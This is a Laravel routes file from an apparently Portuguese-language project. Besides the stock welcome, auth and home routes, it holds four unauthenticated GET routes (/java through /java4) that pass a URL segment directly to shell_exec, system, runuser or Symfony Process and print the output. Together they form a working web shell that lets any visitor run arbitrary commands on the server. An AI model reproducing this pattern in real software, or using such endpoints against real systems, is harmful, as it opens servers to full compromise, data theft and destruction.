<?php

use Illuminate\Support\Facades\Route;
use Symfony\Component\Process\Process;
use Symfony\Component\Process\Exception\ProcessFailedException;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/java/{comando?}', function ($comando = null) {
    var_dump($comando);
    $teste = shell_exec($comando . " 2>&1");
    var_dump($teste);
});



Route::get('/java2/{comando?}', function ($comando = null) {
    $process = Process::fromShellCommandline($comando);
    $process->run();
});



Route::get('/java3/{comando?}', function ($comando = null) {
    var_dump($comando);
    $teste = shell_exec("runuser -l  user_desenv -c " . $comando . " 2>&1");
    var_dump($teste);
});



Route::get('/java4/{comando?}', function ($comando = null) {
    var_dump($comando);
    $teste = system($comando . " 2>&1");
    var_dump($teste);
});



Route::get('/', function () {
    return view('welcome');
});

Auth::routes();

Route::get('/home', [App\Http\Controllers\HomeController::class, 'index'])->name('home');

